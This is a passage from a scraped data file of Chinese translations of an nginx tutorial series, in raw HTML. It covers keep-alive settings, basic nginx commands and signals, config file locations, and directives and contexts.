id=\"crayon-5a6f29791d365416415022-9\"><span class=\"crayon-v\">Warsaw</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">image</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">jpg</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Berlin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d365416415022-10\"><span class=\"crayon-v\">Warsaw</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">image </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Berlin</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d365416415022-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d365416415022-12\"><span class=\"crayon-e\">Close </span><span class=\"crayon-v\">connection</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0036 seconds] -->\r\n<p>对于另一次请求，你将不得不再次执行整个初始化。如果你在短时间内发送多次请求，这可能会快速累积起来。这样的话 keep-alive 使用起来就方便了。在成功响应之后，它保持连接空闲给定的时间段（例如 10 秒）。如果在这段时间内有另一个请求，现有的连接将被重用，空闲时间将被刷新。</p>\n<p>Nginx 提供了几个指令来调整 keepalive 设置。这些可以分为两类：</p>\n<ul>\n<li>在客户端和 nginx 之间 keep-alive</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d368069021612\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nkeepalive_disable msie6;        # disable selected browsers.\r\n\r\n# The number of requests a client can make over a single keepalive connection. The default is 100, but a much higher value can be especially useful for testing with a load‑generation tool, which generally sends a large number of requests from a single client.\r\nkeepalive_requests 100000;\r\n\r\n# How long an idle keepalive connection remains open.\r\nkeepalive_timeout 60;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d368069021612-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d368069021612-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d368069021612-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d368069021612-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d368069021612-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d368069021612-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d368069021612-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d368069021612-1\"><span class=\"crayon-v\">keepalive</span><span class=\"crayon-sy\">_</span>disable <span class=\"crayon-v\">msie6</span><span class=\"crayon-sy\">;</span>        <span class=\"crayon-p\"># disable selected browsers.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d368069021612-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f29791d368069021612-3\"><span class=\"crayon-p\"># The number of requests a client can make over a single keepalive connection. The default is 100, but a much higher value can be especially useful for testing with a load‑generation tool, which generally sends a large number of requests from a single client.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d368069021612-4\"><span class=\"crayon-v\">keepalive</span><span class=\"crayon-sy\">_</span>requests <span class=\"crayon-cn\">100000</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d368069021612-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d368069021612-6\"><span class=\"crayon-p\"># How long an idle keepalive connection remains open.</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d368069021612-7\"><span class=\"crayon-v\">keepalive</span><span class=\"crayon-sy\">_</span>timeout <span class=\"crayon-cn\">60</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p></p>\n<ul>\n<li>在 nginx 和上游服务器之间 keep-alive</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d36c015134981\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nupstream backend {\r\n    # The number of idle keepalive connections to an upstream server that remain open for each worker process\r\n    keepalive 16;\r\n}\r\n\r\nserver {\r\n  location /http/ {\r\n    proxy_pass http://http_backend;\r\n    proxy_http_version 1.1;\r\n    proxy_set_header Connection \"\";\r\n  }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d36c015134981-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d36c015134981-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d36c015134981-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d36c015134981-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d36c015134981-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d36c015134981-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d36c015134981-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d36c015134981-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d36c015134981-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d36c015134981-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d36c015134981-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d36c015134981-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d36c015134981-1\"><span class=\"crayon-e\">upstream</span> <span class=\"crayon-e\">backend</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d36c015134981-2\">    <span class=\"crayon-p\"># The number of idle keepalive connections to an upstream server that remain open for each worker process</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d36c015134981-3\">    <span class=\"crayon-i\">keepalive</span> <span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d36c015134981-4\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d36c015134981-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d36c015134981-6\"><span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d36c015134981-7\">  <span class=\"crayon-e\">location</span> <span class=\"crayon-o\">/</span><span class=\"crayon-e\">http</span><span class=\"crayon-o\">/</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d36c015134981-8\">    <span class=\"crayon-v\">proxy</span><span class=\"crayon-sy\">_</span>pass <span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//http_backend;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d36c015134981-9\">    <span class=\"crayon-v\">proxy_http</span><span class=\"crayon-sy\">_</span>version <span class=\"crayon-cn\">1.1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d36c015134981-10\">    <span class=\"crayon-v\">proxy_set</span><span class=\"crayon-sy\">_</span>header <span class=\"crayon-i\">Connection</span> <span class=\"crayon-s\">\"\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d36c015134981-11\">  <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d36c015134981-12\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>就这些了。</p>\n<h2>总结</h2>\n<p>感谢您的阅读。如果没有大量的资源，这个系列是不可能完成的。在这一系列的写作中，我们发现了一些特别有用的网站：</p>\n<ul>\n<li><a href=\"https://nginx.org/en/docs/\" target=\"_blank\" rel=\"nofollow\">nginx 文档</a></li>\n<li><a href=\"https://www.nginx.com/blog/\" target=\"_blank\" rel=\"nofollow\">nginx 博客</a></li>\n<li><a href=\"https://www.udemy.com/nginx-fundamentals/\" target=\"_blank\" rel=\"nofollow\">udemy（在线教育网站 ）的 nginx 原理</a></li>\n<li><a href=\"https://www.igvita.com/\" target=\"_blank\" rel=\"nofollow\">Ilya Grigorik 的博客</a>，和他的令人惊奇的书：<a href=\"https://hpbn.co/\" target=\"_blank\" rel=\"nofollow\">《高性能浏览器网络》</a></li>\n<li><a href=\"https://blog.martinfjordvald.com/\" target=\"_blank\" rel=\"nofollow\">Martin Fjordvald 的博客</a></li>\n</ul>\n<p>我们会很感激你的反馈和评价，请随意讨论。你喜欢这系列吗？你有什么关于下一步应该解决什么问题的建议吗？或你发现了一个错误？告诉我们，下期再见。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113572\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113572votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113572\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2013/07/Nginx-Logo.jpg"], "title": "Nginx 教程 （1）：基本概念", "fav_nums": 6, "url": "http://blog.jobbole.com/113555/", "create_date": "2018/01/28", "url_object_id": "2f8ffe8851bbe10af9d1063aee4be256", "comment_nums": 2, "front_image_path": "full/2d4fd40c8eaec8319c1de2f154b3275aecd23f9d.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.netguru.co/codestories/nginx-tutorial-basics-concepts\">netguru</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/nginx-tutorial-basics-concepts\">开源中国</a>   </div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/e4745b46a3495eb4c48754bd08a62b75.jpg\" alt=\"\"></p>\n<h2>简介</h2>\n<p>嗨！分享就是关心！所以，我们愿意再跟你分享一点点知识。我们准备了这个划分为三节的《Nginx教程》。如果你对 Nginx 已经有所了解，或者你希望了解更多，这个教程将会对你非常有帮助。</p>\n<p>我们会告诉你 Nginx 是如何工作的，其背后的概念有哪些，以及如何优化它以提升应用程序的性能。还会告诉你如何安装，如何启动、运行。</p>\n<p>这个教程包括三节：</p>\n<ul>\n<li><strong>基础概念</strong>——你可以了解命令（directive）与环境（context）的区别、继承模式，以及 Nginx 选择服务器区块的顺序，还有安装位置。</li>\n<li><strong>性能管理</strong>——提升速度的诀窍。我们将会讲解 gzip、缓存、缓冲区以及超时设置。</li>\n<li><strong>SSL 设置</strong>——讲解用 HTTPS 来提供内容的设置步骤。</li>\n</ul>\n<p>我们的目标是创建一系列教程，让你可以轻松找到特定主题的正确配置，如 gzip、SSL 等，或者直接浏览一下那些配置。为了获得最佳的学习体验，我们建议你在自己的机器上安装 Nginx，并亲手实战一下。</p>\n<h2>什么是 Nginx？</h2>\n<p>Nginx 最初是作为一个 Web 服务器创建的，用于解决 <a href=\"https://en.wikipedia.org/wiki/C10k_problem\" target=\"_blank\" rel=\"nofollow\">C10k</a> 的问题。作为一个 Web 服务器，它可以以惊人的速度为您的数据服务。但 Nginx 不仅仅是一个 Web 服务器，你还可以将其用作反向代理，与较慢的上游服务器（如：Unicorn 或 Puma）轻松集成。你可以适当地分配流量（负载均衡器）、流媒体、动态调整图像大小、缓存内容等等。</p>\n<p>基本的 nginx 体系结构由 master 进程和其 worker 进程组成。master 读取配置文件，并维护 worker 进程，而 worker 则会对请求进行实际处理。</p>\n<h2>基本命令</h2>\n<p>要启动 nginx，只需输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d328d108894665\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[sudo] nginx</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d328d108894665-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d328d108894665-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">sudo</span><span class=\"crayon-sy\">]</span> <span class=\"crayon-v\">nginx</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>当你的 nginx 实例运行时，你可以通过发送相应的信号来管理它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d329d602598157\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[sudo] nginx -s signal</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d329d602598157-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d329d602598157-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">sudo</span><span class=\"crayon-sy\">]</span> <span class=\"crayon-i\">nginx</span> <span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span> <span class=\"crayon-v\">signal</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>可用的信号：</p>\n<ul>\n<li>stop – 快速关闭</li>\n<li>quit – 优雅关闭 (等待 worker 线程完成处理)</li>\n<li>reload – 重载配置文件</li>\n<li>reopen – 重新打开日志文件</li>\n</ul>\n<h2>指令和上下文</h2>\n<p>nginx 的配置文件，默认的位置包括：</p>\n<ul>\n<li><code>/etc/nginx/nginx.conf</code>,</li>\n<li><code>/usr/local/etc/nginx/nginx.conf</code>，或</li>\n<li><code>/usr/local/nginx/conf/nginx.conf</code></li>\n</ul>\n<p>配置文件的由下面的部分构成:</p>\n<ul>\n<li>指令 – 可选项，包含名称和参数，以分号结尾</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32a2915692995\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngzip on;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32a2915692995-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32a2915692995-1\"><span class=\"crayon-i\">gzip</span> <span class=\"crayon-v\">on</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<ul>\n<li>上下文 – 分块，你可以声明指令 – 类似于编程语言中的作用域</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32ac451440402\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div 